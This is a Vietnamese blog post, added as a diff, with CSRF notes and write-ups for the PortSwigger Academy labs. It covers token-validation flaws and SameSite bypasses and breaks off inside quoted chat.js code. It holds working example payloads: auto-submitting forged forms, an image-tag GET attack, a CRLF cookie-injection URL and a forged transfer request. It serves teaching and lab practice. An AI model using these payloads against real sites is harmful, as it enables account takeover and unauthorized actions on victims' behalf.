@@ -1,0 +1,1008 @@
+---
+title: CSRF - PortSwigger
+date: 2025-08-07
+tags: [portswigger, csrf]
+categories: [Thoery, PortSwigger]
+author: bumbi.203_
+---
+
+## CSRF là gì? 
+
+Dịch ra cho dễ hiểu thì CSRF là **"tấn công giả mạo yêu cầu từ trang chéo"** cho phép attacker ép người dùng thực hiện các hành động mà họ ko hề mong muốn. 
+
+Lỗ hổng này cho phép attacker phần nào vượt qua chính sách cùng nguồn (Same Origin Policy) - một cơ chế bảo mật vốn được thiết kế để ngăn các website khác nhau can thiệp lẫn nhau. 
+
+## Tác động của CSRF là gì? 
+
+Nếu tấn công CSRF thành công, attacker khiến người dùng vô tình thực hiện một hành động nào đó. 
+- Thay đổi địa chỉ email trong tài khoản. 
+- Thay đổi mật khẩu. 
+- Thực hiện một giao dịch chuyển tiền 
+
+Tùy vào ngữ cảnh mà attacker có thể gây mức ảnh hưởng nhiều hơn.
+
+## CSRF hoạt động như thế nào ? 
+
+Để thực hiện CSRF, thì cần có 3 điều kiện: 
+- **Một hành động có liên quan** => ứng dụng phải tồn tại một hành động mà attacker có lý do để dụ người dùng thực hiện.
+    - một hành động đặc quyền => chỉnh sửa quyền của người dùng khác 
+    - bất kỳ hành động nào liên quan đến dữ liệu của chính người dùng => thay đổi mật khẩu của người dùng. 
+- **Xử lý phiên dựa trên cookie** => việc thực hiện hành động sẽ tạo ra một hoặc nhiều request HTTP, và ứng dụng chỉ dựa vào session cookie để xác định người dùng nào đã gửi các request đó. 
+- **Không có tham số yêu cầu khó đoán** => Các yêu cầu thực hiện hành động không chứa bất kỳ tham số nào có giá trị mà kẻ tấn công không thể xác định hoặc đoán được. 
+    - Nếu attacker muốn khiến người dùng thay đổi mật khẩu, thì chức năng sẽ không dễ bị tấn công nếu nó yêu cầu kẻ tấn cổng phải biết mật khẩu hiện tại của người dùng. 
+
+Ví dụ 1 ứng dụng cho phép thay đổi mật khẩu trên chính account của họ. Khi mà user thực hiện chức năng này thì sẽ tạo 1 HTTP request như sau: 
+
+```HTTP 
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
+
+email=wiener@normal-user.com
+```
+Thì request này hoàn toàn đủ các điều kiện. 
+- ép người dùng thực hiện thay đổi email 
+- ứng dụng xác thực người dùng chỉ bằng cookie mà ko có biện pháp bảo vệ khác như csrf token 
+- attacker biết trước các tham số cần thiết khi gửi request.
+
+Với các điều kiện trên thì attacker có thể tạo ra 1 form HTML giả mạo như sau: 
+
+```HTML
+<html>
+    <body>
+        <form action="https://vulnerable-website.com/email/change" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+``` 
+
+Nếu user đi vào trong trang web giả mạo của attacker, thì sẽ:
+- Trang của attacker sẽ kích hoạt một yêu cầu HTTP đến website dễ bị tấn công.
+- Nếu nạn nhân đang đăng nhập vào website đó, trình duyệt của họ tự động đính kèm cookie session vào yêu cầu - trừ khi cookie được cấu hình với thuộc tính `SameSite` chặt chẽ. 
+- Website dễ bị tấn công sẽ xử lý yêu cầu như bình thường, coi đó là hành động hợp lệ của người dùng và sẽ thực hiện thay đổi email theo yêu cầu giả mạo của attacker.
+
+## Xây dựng 1 cuộc tấn công CSRF như thế nào? 
+
+Tạo thủ công HTML thì rườm rà nên dùng CSRF Poc generator. 
+- Chọn 1 request bất kỳ đâu để test.
+- Từ menu chuột phải, chọn `Engagement tools / Generate CSRF Poc`
+- Burp Suite sẽ tạo ra đoạn mã HTML giúp kích hoạt request đã chọn (trừ phần cookie, cookie sẽ tự động được trình duyệt của nạn nhân thêm vào).
+- Có thể tinh chỉnh các tùy chọn trong trình tạo CSRF PoC để điều chỉnh chi tiết của cuộc tấn công. Điều này hữu ích trong các trường hợp bất thường khi request có các đặc điểm lạ.
+- Sao chép đoạn mã HTML được tạo vào một trang web, mở trang đó trong trình duyệt đang đăng nhập vào website dễ bị tấn công và kiểm tra xem request có được gửi thành công và hành động mong muốn có xảy ra hay không.
+
+### LAB01 
+
+Lab này có chức năng thay đổi email và mục tiêu là mình cần thực hiện CSRF để dụ người dùng thay đổi email. 
+
+Đầu tiên mình cần login vào 1 account `wiener:peter`, sau đó thử update 1 email. 
+
+![image](/assets/images/PortSwigger/csrf/image1.png)
+
+Từ đây mình thấy nó hoàn toàn thực hiện được CSRF: 
+- lí do để thực hiện tấn công là thay đổi email 
+- xác thực người dùng dựa trên cookie session 
+- ko có tham số khó đoán 
+
+Sau đó, mình chọn vào `Engagement tools / Generate CSRF Poc` 
+
+![image](/assets/images/PortSwigger/csrf/image2.png)
+
+Từ đây, nó đã tạo ra 1 form HTML như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image3.png)
+
+Cuối cùng mình copy form HTML này và đưa vào trong exploit server. 
+
+![image](/assets/images/PortSwigger/csrf/image4.png)
+
+Sau đó, gửi cho victim thì sẽ solve được lab. 
+
+## Cách gửi một đoạn mã khai thác CSRF đến nạn nhân 
+
+Kẻ tấn công thường đặt đoạn HTML độc hại lên 1 trang web do attacker kiểm soát, rồi dụ user truy cập vào trang đó. 
+
+Điều này có thể thực hiện thông qua việc gửi liên kết qua email hoặc mạng xã hội. Nếu đoạn tấn công được chèn vào một trang web phổ biến (ví dụ như phần bình luận), kẻ tấn công chỉ cần chờ nạn nhân truy cập trang web đó. 
+
+Một số cuộc tấn công CSRF đơn giản chỉ dùng phương thức GET và có thể được thực hiện thông qua một URL duy nhất trên trang web dễ bị tổn thương. 
+Trong trường hợp này, kẻ tấn công không cần tạo trang ngoài, mà chỉ cần gửi URL độc hại trực tiếp cho nạn nhân (qua email, mạng xã hội,...)
+
+```HTML 
+<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
+```
+
+### XSS và CSRF 
+
+Giải thích sự khác biệt giữa XSS và CSRF. 
+
+### Sự khác biệt XSS và CSRF là gì? 
+
+XSS cho phép attacker thực hiện tùy ý JavaScript với trình duyệt của nạn nhân. 
+
+CSRF cho phép attacker dẫn dụ người dùng thực hiện những hành động mà họ ko mong muốn. 
+
+Hậu quả của XSS thì nghiêm trọng hơn CSRF, vì: 
+- CSRF: attacker lừa người dùng tự gửi request mà người dùng ko biết. Nhưng attacker ko thấy được phản hồi từ server.
+- XSS: attacker chạy được JavaScript trong trình duyệt của người dùng. Từ đó có thể gửi requets đọc phản hồi, và đánh cắp dữ liệu như cookie, token,...
+
+### CSRF token có thể chống được XSS ko ? 
+
+Một số cuộc tấn công XSS có thể bị ngăn chặn khi sử dụng CSRF token một cách hiệu quả. 
+
+```URL
+https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
+``` 
+Thêm CSRF token vào thì như sau: 
+
+```URL 
+https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>
+``` 
+
+Giả sử server kiểm tra đúng token CSRF và từ chối các request ko có token hợp lệ, thì token này có thể ngăn chặn việc khai thác lỗ hổng XSS (Reflected XSS). 
+
+Giải thích từ **cross-site scripting** - nghĩa là cuộc tấn công xuất phát từ một trang web khác (**cross-site**). Khi attacker cố gắng gửi 1 request từ trang web họ kiểm soát đến website nạn nhân, nếu token CSRF token ko hợp lệ thì request bị từ chối, và đoạn script ko bao giờ được phản hồi để thực thi. 
+
+Những mối quan hệ quan trọng về mối liên hệ giữa CSRF token và XSS::
+1. Token CSRF không bảo vệ toàn bộ website khỏi XSS: 
+    - Nếu có lỗ hổng reflected XSS ở chỗ ko có token CSRF, thì vẫn bị khai thác.
+2. XSS có thể vượt qua CSRF token: 
+    - Nếu attacker đã khai thác được lỗ hổng XSS ở đâu đó, attacker có thể viết script để: 
+        - Gửi request nội bộ đến lấy CSRF token.
+        - Dùng token này thực hiện hành vi nguy hiểm, như đổi mật khẩu, email,...
+3. CSRF token ko chặn được lỗ hổng Stored XSS: 
+    - Nếu trang có stored XSS, thì payload vẫn sẽ chạy khi nạn nhân truy cập trang, dù trang đó có CSRF token hay ko. 
+
+## Một vài cách phòng thủ chống lại CSRF 
+
+Những cơ chế phòng thủ phổ biến nhất: 
+- **CSRF token** - là một giá trị **duy nhất**, **bí mật** và **khó đoán**, được tạo ra từ server và chia sẻ với trình duyệt. Khi thực hiện một hành động nhạy cảm, chẳng hạn như gửi form, phía client phải gửi kèm token CSRF hợp lệ trong request. Điều này khiến cho attacker rất khó để tạo ra một request hợp lệ thay cho nạn nhân. 
+- **SameSite cookies** - là một cơ chế bảo mật của trình duyệt giúp xác định khi nào cookie của một website được gửi kèm theo các request bắt nguồn từ website khác. Với chính sách này, cookie đăng nhập sẽ ko được gửi kèm nếu yêu cầu đến từ trang khác, từ đó ngăn chặn tấn công CSRF.
+- **Referer-based validation** - Ứng dụng kiểm tra header Referer để xem yêu cầu có đến từ cùng domain hay không. Nếu không phải, yêu cầu có thể bị chặn => chống CSRF. Tuy nhiên, không an toàn bằng CSRF token, vì Referer có bị chặn, ẩn, hoặc giả mạo trong một số trường hợp. 
+
+## Bypass xác thực CSRF token 
+
+### CSRF token là gì? 
+
+**CSRF token** là một giá trị **duy nhất**, **bí mật** và **khó đoán**, được tạo ra từ server và chia sẻ với trình duyệt. Khi thực hiện một hành động nhạy cảm, chẳng hạn như gửi form, phía client phải gửi kèm token CSRF hợp lệ trong request. Điều này khiến cho attacker rất khó để tạo ra một request hợp lệ thay cho nạn nhân. 
+
+Một cách phổ biến để chia sẻ CSRF token với client là **chèn nó vào dưới dạng một trường ẩn** trong form HTML, ví dụ: 
+
+```HTML 
+<form name="change-email-form" action="/my-account/change-email" method="POST">
+    <label>Email</label>
+    <input required type="email" name="email" value="example@normal-website.com">
+    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
+    <button class='button' type='submit'> Update email </button>
+</form>
+``` 
+
+Submit form thì kết quả sẽ của request là: 
+
+```HTTP 
+POST /my-account/change-email HTTP/1.1
+Host: normal-website.com
+Content-Length: 70
+Content-Type: application/x-www-form-urlencoded
+
+csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
+``` 
+
+### Lỗ hổng chung trong xác thực CSRF token 
+
+### Xác thực CSRF token dựa trên request method 
+
+Một vài ứng dụng dùng csrf token trong POST method nhưng lại bỏ qua trong GET method. 
+
+```HTTP
+GET /email/change?email=pwned@evil-user.net HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+```
+### LAB02 
+
+Trong lab này thì yêu cầu thực hiện CSRF để đổi email. 
+
+![image](/assets/images/PortSwigger/csrf/image5.png)
+
+Như vậy thì thấy có csrf được đính trong method POST. Nhưng mình đổi thành GET xem có gì xảy ra ko? 
+
+![image](/assets/images/PortSwigger/csrf/image6.png)
+
+Thì hoàn toàn hợp lí nếu mình truyền theo GET method. 
+
+Vậy thực hiện thao tác tấn công như lab trên. 
+
+![image](/assets/images/PortSwigger/csrf/image7.png)
+
+### Xác thực csrf token phụ thuộc vào sự tồn tại của token này trong request. 
+
+Một vài ứng dụng thực hiện xác thực token đúng cách khi token có mặt, nhưng lại bỏ qua bước xác thực nếu token bị thiếu. 
+
+Dẫn đến attacker có thể bỏ toàn bộ tham số chứa mã token để vượt qua quá trình xác thực và thực hiện tấn công CSRF. 
+
+```HTTP
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+
+email=pwned@evil-user.net
+```
+
+![image](/assets/images/PortSwigger/csrf/image8.png)
+
+Nên mình thử xóa đi toàn bộ tham số csrf xem nó có hoạt động ko ?
+
+![image](/assets/images/PortSwigger/csrf/image9.png)
+
+Thì nó hoàn toàn vẫn có thể thực hiện được. 
+
+Nên mình để có thể tấn công như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image10.png)
+
+### CSRF token không được liên kết với phiên của người dùng 
+
+Đây là một lỗi triển khai CSRF token phổ biến, là server ko ràng buộc csrf token với phiên người dùng cụ thể mà chỉ kiểm tra sự tồn tại của token trong danh sách đã phát sinh. 
+
+Điều này cho phép attacker tái sử dụng token từ tài khoản của chính mình để tấn công người dùng khác - làm cho cơ chế bảo vệ CSRF trở nên vô hiệu. 
+
+### LAB03 
+
+Ở lab này mình được cấp hai tài khoản. 
+
+Đầu tiên mình đăng nhập vào account đầu tiên là `wiener:peter` và change email, dùng intercept để chặn request xong rồi copy cái csrf_token rồi drop đi. 
+
+![image](/assets/images/PortSwigger/csrf/image11.png)
+
+Sau đó, mở 1 trình duyệt ẩn danh rồi login vào bằng tài khoản thứ hai. 
+
+![image](/assets/images/PortSwigger/csrf/image12.png)
+
+Ở đây cũng có 1 csrf token. Vậy nếu mình change email trong tài khoản carlos mà csrf token của wiener thì sao? 
+
+![image](/assets/images/PortSwigger/csrf/image13.png)
+
+![image](/assets/images/PortSwigger/csrf/image14.png)
+
+Từ đây mình khai thác như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image15.png)
+
+### CSRF token được ràng buộc với một cookie không thuộc phiên làm việc (non-session cookie)
+
+Việc ràng buộc token với 1 một cookie ko liên quan đến phiên đăng nhập là sai về mặt logic bảo mật, và tạo ra lỗ hổng CSRF nghiêm trọng, đặc biệt là attacker có thể tái sử dũng token đã lấy được từ phiên khác. 
+
+```HTTP
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
+
+csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
+```
+Một số ứng dụng liên kết CSRF token với một cookie riêng (không phải cookie phiên đăng nhập). Điều này vẫn có thể bị khai thác nếu attacker tìm cách chèn cookie của mình vào trình duyệt của nạn nhân.
+
+Khi đó, attacker dùng tài khoản của mình để tạo token và cookie hợp lệ, rồi ép trình duyệt nạn nhân sử dụng chúng. Nhờ vậy, server sẽ chấp nhận token đó và cuộc tấn công CSRF thành công.
+
+### LAB04 
+
+Lab này thì mình cũng được cung cấp hai account tương tự như lab. 
+
+Đầu tiên mình login vào tài khoản `wiener:peter`
+
+![image](/assets/images/PortSwigger/csrf/image16.png)
+
+Từ đây thấy trong Cookie có hai trường là `session` và `csrfKey`, trong phần thân thì có `csrf`
+
+Tiếp tục login vào tài khoản thứ hai là `carlos`
+
+![image](/assets/images/PortSwigger/csrf/image17.png)
+
+Nếu mình dùng csrf và csrfKey của tài khoản weiner trong tài khoản carlos thì sao? 
+
+![image](/assets/images/PortSwigger/csrf/image18.png)
+
+![image](/assets/images/PortSwigger/csrf/image19.png)
+
+Như vậy là do `csrfKey` nằm trong phần header, mình phải tìm cách thay đổi `csrfKey` của nạn nhân. 
+
+**Từ đây mình thấy rõ là `csrfKey` và `csrf` đều ko thay đổi. Chỉ có `session` thì thay đổi thôi.**
+
+Như vậy nếu mình set được `csrfKey` trong cookie và nhập đúng `csrf` thì đổi được email. 
+
+Và thông qua chức năng search của thấy như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image20.png)
+
+Nó ko có đính kèm `csrfKey` trong response. Vậy nếu mình truyền như sau thì sao: 
+
+![image](/assets/images/PortSwigger/csrf/image21.png)
+
+Như vậy mình có thể set được `csrfKey` trong Cookie. Và mình set thêm `SameSite=None` là một giá trị trong cookie, dùng để cho phép cookie được gửi đi trong các yêu cầu giữa các domain khác nhau. 
+
+Giờ mình tạo ra 1 form giả để gửi tới nạn nhân. 
+
+```HTML
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+    <form action="https://0a01002404dac1fc846a72ce000900a2.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@gmail.com" />
+      <input type="hidden" name="csrf" value="dq6P9ixWt9O5zOqMIglsZsJejRB7F8vm" />
+      <input type="submit" value="Submit request" />
+    </form>
+		<img src="https://0a01002404dac1fc846a72ce000900a2.web-security-academy.net/?search=hahaha%0d%0aSet-Cookie: csrfKey=qjNuibHS4XFzEbJBFx5wWTvA6K7iVs3E; SameSite=None" onerror="document.forms[0].submit()">
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+Do mình tấn công `weiner` nên mình thay `csrf` và `csrfKey` của carlos. 
+
+Không cần tấn công trực tiếp vào domain chính. Chỉ cần một subdomain có thể đặt cookie — là có thể tấn công domain khác trong cùng hệ thống.
+
+### CSRF Token đơn giản chỉ được sao chép vào trong Cookie 
+
+**Double Submit Token** là kỹ thuật chống CSRF bằng cách gửi cùng một mã token trong cookie và body hoặc header của request. Server chỉ cần so sánh hai giá trị này để xác thực yêu cầu.
+
+```HTTP
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
+
+csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
+```
+
+Kẻ tấn công có thể tự tạo token giả và đặt nó vào trình duyệt của nạn nhân thông qua tính năng set-cookie, từ đó thực hiện tấn công CSRF mà không cần token hợp lệ.
+
+### LAB05
+
+Lab này được cung cấp 1 tài khoản `weiner:peter`
+
+![image](/assets/images/PortSwigger/csrf/image22.png)
+
+Khi update email thì ứng dụng có triển khai Double Submit token => chống CSRF 
+
+![image](/assets/images/PortSwigger/csrf/image23.png)
+
+Nhưng trong chức năng search của web lại ko set `csrf` trong response. 
+
+![image](/assets/images/PortSwigger/csrf/image24.png)
+
+Như vậy nếu mình chèn như sau:
+
+![image](/assets/images/PortSwigger/csrf/image25.png)
+
+Như vậy thì mình hoàn toàn có thể khai thác CSRF như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image26.png)
+
+## Vượt qua các hạn chế của cookie SameSite 
+
+SameSite là cơ chế bảo mật của trình duyệt giúp hạn chế việc gửi cookie trong các request giữa các trang web, nhằm giảm thiểu rủi ro từ các cuộc tấn công như `CSRF`, rò rỉ dữ liệu và khai thác `CORS`. 
+Từ năm 2021, Chrome mặc định áp dụng chính sách `SameSite=Lax` nếu không có thiết lập rõ ràng từ máy chủ. Hiểu rõ cách hoạt động và các kỹ thuật vượt qua hạn chế SameSite là điều quan trọng để đánh giá và khai thác các lỗ hổng liên quan đến tấn công giữa các trang web.
+
+## Khái niệm `"site"` trong ngữ cảnh của cookie SameSite 
+
+Trong ngữ cảnh này thì `"site"` được định nghĩa là **tên miền cấp cao nhất (TLD)** - thường là `.com`, `.net`,... - kèm theo 1 tên miền cấp nữa, tạo thành cấu trúc gọi là **`LD+1`** 
+
+Khi xác định 1 request có phải là **SameSite** hay ko cũng dựa vào giao thức, ví dụ: từ `http://example.com` đến `https://example.com` thì truyền duyệt coi là `cross-site`. 
+
+![image](/assets/images/PortSwigger/csrf/image27.png)
+
+`eTLD` => effective top-level domain eTLD là khái niệm dùng để xử lý những tên miền nhiều phần đặc biệt như `.co.uk`, vì chúng được xem như TLD trong thực tế sử dụng.
+
+## Sự khác biệt giữa `site` và `origin` là gì? 
+
+✅ Origin là phạm vi hẹp, đại diện cho một URL cụ thể, gồm:
+👉 **scheme + domain + port**
+→ Phải giống hoàn toàn cả 3 thì mới gọi là **same-origin**.
+
+✅ Site là phạm vi rộng hơn, gồm nhiều origin có cùng “miền gốc”.
+👉 Chỉ cần giống:
+- scheme, và
+- eTLD+1 (ví dụ: example.com, cyberjutsu.io)
+
+→ Có thể khác subdomain và khác port
+→ Vẫn được coi là same-site.
+
+📘 Ví dụ minh họa:
+https://a.example.com và https://b.example.com
+→ ❌ Khác origin
+→ ✅ Cùng site
+
+https://example.com:443 và https://example.com:8443
+→ ❌ Khác origin
+→ ✅ Cùng site
+
+Từ đây mình có thể đọc chi tiết tại đây: [Same Origin và Cross Origin](https://htmli.cyberjutsu-lab.tech/pages/sandbox/#level_4)
+
+## SameSite hoạt động như thế nào ? 
+
+Trước đây, trình duyệt luôn gửi cookie dù request đến từ trang nào, nên dễ bị CSRF.
+Cơ chế SameSite giúp giới hạn việc gửi cookie chỉ khi request thực sự đến từ cùng site, từ đó ngăn chặn tấn công CSRF.
+
+Có 3 loại SameSite chính là: 
+- `Strict`
+- `Lax`
+- `None` 
+
+Thì dev có thể thiết lập trong phần cookie qua thuộc tính `SameSite` trong header `Set-Cookie`.
+```HTTP
+Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
+``` 
+
+Tuy nhiên, chỉ dựa vào **SameSite** là không đủ an toàn tuyệt đối – kẻ tấn công vẫn có thể khai thác trong một số tình huống đặc biệt.
+
+Nếu bạn không đặt SameSite cho cookie, Chrome sẽ mặc định áp dụng `SameSite=Lax` để tăng cường bảo mật.
+Điều này giúp giảm nguy cơ bị CSRF, kể cả khi lập trình viên quên không cấu hình
+
+### Strict 
+
+✅ **SameSite=Strict = rất an toàn**, không bao giờ gửi cookie nếu request đến từ trang khác.
+✅ Thích hợp cho các cookie quan trọng, liên quan đến quyền (auth, CSRF).
+❌ Nhưng có thể gây lỗi hoặc bất tiện nếu ứng dụng cần tương tác cross-site như: SSO, liên kết từ email, redirect từ app khác...
+
+### Lax 
+
+**SameSite=Lax** chỉ cho gửi cookie khi:
+
+✅GET request
+✅Và do người dùng click link, chuyển trang.
+
+Không gửi cookie nếu là:
+❌POST cross-site
+❌Request từ iframe, script, ảnh...
+
+👉 Điều này giúp giảm rủi ro CSRF nhưng vẫn cho phép người dùng bấm link từ email / web khác để đăng nhập.
+
+### None 
+
+✅**SameSite=None** → Gửi cookie trong mọi request, kể cả từ trang khác.
+Trước đây, nếu không ghi SameSite, thì trình duyệt (trừ Chrome) coi như là None.
+
+👉 Hữu ích khi:
+- Cookie dùng ở bên thứ ba (VD: nhúng iframe, phân tích, theo dõi).
+- Cookie không nhạy cảm.
+
+❌ Tuy nhiên:
+Một số web dùng None cho mọi cookie, kể cả cookie đăng nhập → nguy hiểm, dễ bị CSRF.
+
+Khi thiết lập cookie với **SameSite=None**, trang web cũng phải kèm theo thuộc tính **Secure**, nhằm đảm bảo rằng cookie chỉ được gửi qua các kết nối được mã hóa bằng **HTTPS**. Nếu không, trình duyệt sẽ từ chối cookie và nó sẽ không được thiết lập.
+
+```HTTP
+Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure
+``` 
+
+## Bypass SameSite Lax bằng cách dùng GET requests 
+
+Trên thực tế, các máy chủ không phải lúc nào cũng khắt khe về việc nhận yêu cầu `GET` hay `POST` cho một endpoint nhất định, kể cả khi endpoint đó dự kiến nhận dữ liệu từ một biểu mẫu (form).
+
+Nếu máy chủ cũng dùng thuộc tính **SameSite=Lax** cho cookie phiên (session cookie) – dù được cấu hình rõ ràng hay do trình duyệt tự gán mặc định – thì bạn vẫn có thể thực hiện **tấn công CSRF** bằng cách khiến trình duyệt nạn nhân gửi một yêu cầu `GET`.
+
+Miễn là trình duyệt đang chuyển hướng chính (top-level navigation), thì cookie của phiên đăng nhập vẫn sẽ được gửi đi. 
+
+💡 Hiểu đơn giản là:
+🧪 Khi nạn nhân bấm vào 1 đường link và trình duyệt chuyển đến trang mới → đó gọi là top-level navigation.
+🧪 Nếu cookie có thuộc tính SameSite=Lax, thì trình duyệt sẽ gửi cookie đó đi, dù trang mới là từ website khác (cross-site).
+🧪 Vì vậy, attacker có thể lợi dụng điều này để tấn công CSRF.
+
+```javascript
+<script>
+    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
+</script>
+``` 
+
+Ngay cả khi một request GET thông thường không được chấp nhận, một số framework vẫn cung cấp cách để ghi đè phương thức (method) được chỉ định trong dòng đầu của request.
+
+Ví dụ, **Symfony** hỗ trợ tham số **_method** trong các form, tham số này sẽ được ưu tiên hơn phương thức HTTP thông thường khi xử lý định tuyến (routing):
+
+```HTML
+<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
+    <input type="hidden" name="_method" value="GET">
+    <input type="hidden" name="recipient" value="hacker">
+    <input type="hidden" name="amount" value="1000000">
+</form>
+```
+Và ngoài những framework khác thì nó có tham số hỗ trợ khác.
+
+### LAB06 
+
+Lab này mình cũng được cấp 1 tk `wiener:peter` => sau đó mình cũng thực hiện thay đổi email. 
+
+![image](/assets/images/PortSwigger/csrf/image28.png)
+
+Như vậy có thể hoàn toàn có thể tấn công CSRF vì cookie session có thể gửi cross-site với GET request, miễn là chuyển hướng top-level. 
+
+![image](/assets/images/PortSwigger/csrf/image29.png)
+
+Nó hoàn toàn có thể thay đổi email. 
+
+![image](/assets/images/PortSwigger/csrf/image30.png)
+
+Như vậy mình có thể khai thác như sau để gửi đến nạn nhân. 
+
+![image](/assets/images/PortSwigger/csrf/image31.png)
+
+## Bypass hạn chế SameSite bằng cách sử dụng các thành phần có sẵn trên Web (on-site gadgets) 
+
+Nếu được set thuộc tính là `SameSite=Strict` sẽ không được gửi trong các yêu cầu cross-site, nhưng hạn chế này có thể bị vượt qua nếu khai thác được các thành phần nội tại có khả năng tạo yêu cầu nội bộ trong cùng miền.
+
+Chức năng chuyển hướng có thể bị lợi dụng để đánh lừa trình duyệt rằng yêu cầu xuất phát từ cùng miền, qua đó vượt qua được bảo vệ của SameSite.
+
+Trình duyệt coi chuyển hướng phía client như một yêu cầu bình thường trong cùng miền, nên vẫn gửi kèm cookie. Nếu hacker điều khiển được chuyển hướng này để gửi yêu cầu độc hại, thì có thể bỏ qua luôn hạn chế của SameSite.
+
+Lưu ý:
+- Client-side redirect: Có thể dùng để vượt qua SameSite vì request được coi là cùng miền.
+- Server-side redirect: Không thể bypass SameSite vì request gốc là cross-site nên trình duyệt không gửi cookie. 
+
+### LAB07 
+
+Lab này cũng được cung cấp 1 tài khoản `wiener:peter`. 
+
+Thì nó có 1 chức năng comment là khi đó submit thì nó sẽ chuyển hướng tới `/post/comment/confirmation?postId=x` sau đó chuyển hướng về lại trang bài post. 
+
+Quan sát trong burp thì thấy có gọi tới 1 endpoint file JS. 
+
+![image](/assets/images/PortSwigger/csrf/image32.png)
+
+Như vậy nếu mình thay đổi `postId` thành 1 `postId` ko có thật để xem phản ứng. 
+
+![image](/assets/images/PortSwigger/csrf/image33.png)
+
+Nó hoàn toàn chuyển hướng về `/post/helloanhem` như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image34.png)
+
+Nếu thử mình inject path traversal vào tham số này thì như thế nào ?
+ 
+![image](/assets/images/PortSwigger/csrf/image35.png)
+
+Thì nó chuyển hướng về `my-account`, vậy nếu lợi dụng để nó chuyển hướng về `change-email` thì sao. 
+
+![image](/assets/images/PortSwigger/csrf/image36.png)
+
+## Bypass SameSite thông qua các tên miên liên quan có lỗ hổng 
+
+Một request vẫn có thể được coi là same-site, ngay cả khi đến từ một origin khác – điều này rất quan trọng khi kiểm thử hoặc bảo vệ web.
+
+Cần kiểm tra kỹ tất cả các subdomain vì chỉ một lỗ hổng như XSS trên một tên miền anh em cũng có thể khiến toàn bộ hệ thống bị tấn công cross-site, vượt qua các cơ chế bảo vệ như SameSite.
+
+Ngoài CSRF truyền thống, nếu ứng dụng dùng WebSocket, cần đề phòng tấn công CSWSH – một dạng CSRF nhắm vào quá trình handshake của WebSocket.
+
+### LAB08 
+
+Với lab này thì có chức năng chat và mình cần chiếm quyền WebSocket qua cross-site (CSWSH). 
+
+Khi truy cập `/chat` => thì nhận 1 response như sau: 
+
+![image](/assets/images/PortSwigger/csrf/image37.png)
+
+Khi đó thấy 101 Switching Protocol thì nó sẽ nâng cấp lên Websocket. 
+
+![image](/assets/images/PortSwigger/csrf/image38.png)
+
+Từ đó nó fetch tới endpoint là `chat.js` và hình như lưu tại: `https://cms-0aa1000c03396524806d1c66009b000e.web-security-academy.net`
+
+![image](/assets/images/PortSwigger/csrf/image39.png)
+
+Thì toàn bộ source nó nằm ở đây: 
+```javascript
+(function () {
+    var chatForm = document.getElementById("chatForm");
+    var messageBox = document.getElementById("message-box");
+    var webSocket = openWebSocket();
+
+    messageBox.addEventListener("keydown", function (e) {
+        if (e.key === "Enter" && !e.shiftKey) {
+            e.preventDefault();
+            sendMessage(new FormData(chatForm));
+            chatForm.reset();
+        }
+    });
+
+    chatForm.addEventListener("submit", function (e) {
+        e.preventDefault();
+        sendMessage(new FormData(this));
+        this.reset();
+    });
+
+    function writeMessage(className, user, content) {
+        var row = document.createElement("tr");
+        row.className = className
+
+        var userCell = document.createElement("th");
+        var contentCell = document.createElement("td");
+        userCell.innerHTML = user;
+        contentCell.innerHTML = (typeof window.renderChatMessage === "function") ? window.renderChatMessage(content) : content;
+
+        row.appendChild(userCell);
+        row.appendChild(contentCell);
+        document.getElementById("chat-area").appendChild(row);
+    }
+
+    function sendMessage(data) {
+        var object = {};
+        data.forEach(function (value, key) {
+            object[key] = htmlEncode(value);
+        });
+
+        openWebSocket().then(ws => ws.send(JSON.stringify(object)));
+    }
+
+    function htmlEncode(str) {
+        if (chatForm.getAttribute("encode")) {
+            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
+                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
+                return lookup[c];
+            });
+        }
